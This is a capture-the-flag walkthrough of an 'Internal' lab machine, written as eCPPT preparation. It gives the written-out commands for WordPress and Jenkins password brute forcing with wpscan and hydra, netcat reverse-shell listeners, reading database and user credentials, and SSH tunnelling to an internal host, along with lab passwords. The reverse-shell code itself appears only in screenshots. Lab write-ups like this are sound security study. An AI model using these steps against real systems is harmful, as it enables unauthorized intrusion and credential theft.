# Internal

Preparation for eCPPT

# Recon

### PortScan

`nmap -sCV 10.10.168.146`

![Untitled](images/Untitled.png)

Lets add the name of the machine to `/etc/hosts`

![Untitled](images/Untitled%201.png)

## Web

### Directory Discovery

`ffuf -u [http://internal.thm/FUZZ](http://internal.thm/FUZZ) -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

![Untitled](images/Untitled%202.png)

### Wordpress

By using username `admin` we could enumerate the user, now its time to find the password

![Untitled](images/Untitled%203.png)

**Brute force**

`wpscan --url [http://internal.thm/blog/wp-login.php](http://internal.thm/blog/wp-login.php) --usernames admin --passwords /usr/share/wordlists/rockyou.txt`

Version

![Untitled](images/Untitled%204.png)

**Credentials**

`admin:my2boys`

![Untitled](images/Untitled%205.png)

**Access to WordPress**

![Untitled](images/Untitled%206.png)

Inside the theme customization edit and put a reverse shell inside the file `404.php`

![Untitled](images/Untitled%207.png)

Now open a listener on the attacker machine

`nc -lvnp 9999`

Open the page that you put the reverse shell

![Untitled](images/Untitled%208.png)

We can verify that we got a shell

![Untitled](images/Untitled%209.png)

## Privileges Escalation

Searching for mysql credentials

`cat wp-config.php`

![Untitled](images/Untitled%2010.png)

### SQL

Login to sql using those credentials

`mysql -u wordpress -p`

`wordpress123`

![Untitled](images/Untitled%2011.png)

Extracting **admin** credentials

![Untitled](images/Untitled%2012.png)

Password Hash > `$P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/`

![Untitled](images/Untitled%2013.png)

### Aubreanna User

`cat /opt/wp-save.txt`

![Untitled](images/Untitled%2014.png)

`aubreanna:bubb13guM!@#123`

Login as SSH 

`ssh aubreanna@internal.thm`

![Untitled](images/Untitled%2015.png)

As we look for some files inside the machine we see that there is a internal machine

![Untitled](images/Untitled%2016.png)

## Pivoting

### SSH tunnel

With the credentials of the user aubreanna we setup an SSH tunnel for the internal machine

`ssh -L {LOCAL-PORT}:172.17.0.2:{TARGET-PORT} aubreanna@internal.thm`

`ssh -L 80:172.17.0.2:8080 aubreanna@internal.thm`

### Jenkins

![Untitled](images/Untitled%2017.png)

### Brute Force

`hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password”`

![Untitled](images/Untitled%2018.png)

Now its time for some `RCE`

![Untitled](images/Untitled%2019.png)

### RCE

On the manage Jenkins there is a Script Console so lets use it

![Untitled](images/Untitled%2020.png)

Now we have to prepare our netcat

`nc -lvnp 9999`

![Untitled](images/Untitled%2021.png)

I search for some RCE using Java Language and found this one

![Untitled](images/Untitled%2022.png)

So after setting our IP and our Port should be like this, and press `run`

![Untitled](images/Untitled%2023.png)

We can confirm that we got a shell on our listener

![Untitled](images/Untitled%2024.png)

**Upgrading the shell**

We found the machine has `python2` so we use it to upgrade the shell and set a terminal variable

![Untitled](images/Untitled%2025.png)

After some enumeration found a file named note.txt and there are some **root credentials**

![Untitled](images/Untitled%2026.png)

`root:tr0ub13guM!@#123`

With those credentials we escalate the privileges of the machine and getting the flag

![Untitled](images/Untitled%2027.png)
